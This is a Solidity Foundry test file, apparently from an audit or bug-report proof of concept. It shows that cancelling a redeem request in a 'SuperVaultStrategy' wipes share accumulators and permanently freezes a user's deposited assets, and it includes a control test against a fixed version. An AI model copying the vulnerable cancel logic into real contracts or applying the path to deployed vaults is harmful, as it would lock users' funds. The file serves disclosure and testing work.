// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SuperVaultStrategy,
    SuperVaultStrategyFixed,
    MiniToken
} from "./63081-cancelled-redeem-requests-make-shares-permanently-unredeemab.sol";

contract CancelledRedeemLocksSharesTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000a11;

    uint256 internal constant DEPOSIT_ASSETS = 100 ether;
    uint256 internal constant DEPOSIT_SHARES = 100 ether;

    function test_exploit_cancelledRedeemPermanentlyLocksShares() public {
        Exploit e = new Exploit();
        e.run();

        // The operator fulfill reverted: the user's re-requested redeem can NEVER
        // be fulfilled after the cancel wiped the accumulators.
        assertTrue(e.fulfillReverted(), "fulfill must revert (harm)");

        // Accumulators were wiped by `delete superVaultState[controller]`.
        SuperVaultStrategy strat = SuperVaultStrategy(e.strategyAddr());
        (,,, uint256 accShares, uint256 accCostBasis,) = strat.superVaultState(USER);
        assertEq(accShares, 0, "accumulatorShares wiped");
        assertEq(accCostBasis, 0, "accumulatorCostBasis wiped");

        // The full 100e18 asset backing is frozen in the strategy, unredeemable.
        MiniToken asset = MiniToken(e.assetAddr());
        assertEq(asset.balanceOf(e.strategyAddr()), DEPOSIT_ASSETS, "asset backing frozen in strategy");
        assertEq(e.lockedInStrategy(), DEPOSIT_ASSETS, "locked magnitude");
        assertEq(asset.balanceOf(USER), 0, "user got nothing back");

        // Frozen magnitude recorded on the LOCKED-SHARES marker to the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), DEPOSIT_SHARES, "marker records locked shares at SINK");
        assertEq(e.sinkMarkerBalance(), DEPOSIT_SHARES, "sink marker balance");
    }

    /// @notice The exact revert selector on the fulfill consume path, tested
    ///         directly against a fresh vulnerable strategy.
    function test_exploit_fulfillRevertsWithInsufficientShares() public {
        MiniToken asset = new MiniToken("Vault Asset", "ASSET");
        SuperVaultStrategy strat = new SuperVaultStrategy(address(asset));
        asset.mint(address(strat), DEPOSIT_ASSETS);

        strat.handleDeposit(USER, DEPOSIT_ASSETS, DEPOSIT_SHARES);
        strat.requestRedeem(USER, DEPOSIT_SHARES);
        strat.cancelRedeem(USER); // delete wipes accumulators
        strat.requestRedeem(USER, DEPOSIT_SHARES);

        vm.expectRevert(SuperVaultStrategy.INSUFFICIENT_SHARES.selector);
        strat.fulfillRedeem(USER, DEPOSIT_SHARES, USER);
    }

    /// @notice Negative control: the FIXED cancel clears only the pending
    ///         metadata, so cancel -> re-request -> fulfill succeeds and pays
    ///         the assets out. Proves the harm is caused by the `delete` bug.
    function test_control_fixedCancel_allowsRedeemAfterCancel() public {
        MiniToken asset = new MiniToken("Vault Asset", "ASSET");
        SuperVaultStrategyFixed strat = new SuperVaultStrategyFixed(address(asset));
        asset.mint(address(strat), DEPOSIT_ASSETS);

        strat.handleDeposit(USER, DEPOSIT_ASSETS, DEPOSIT_SHARES);
        strat.requestRedeem(USER, DEPOSIT_SHARES);
        strat.cancelRedeem(USER); // fixed: preserves accumulators
        strat.requestRedeem(USER, DEPOSIT_SHARES);
        strat.fulfillRedeem(USER, DEPOSIT_SHARES, USER); // succeeds

        // The user gets their full asset backing; nothing is frozen.
        assertEq(asset.balanceOf(USER), DEPOSIT_ASSETS, "fixed path pays the user");
        assertEq(asset.balanceOf(address(strat)), 0, "no assets frozen under the fix");
        (,,, uint256 accShares,,) = strat.superVaultState(USER);
        assertEq(accShares, 0, "accumulator drawn down by the successful fulfill");
    }
}
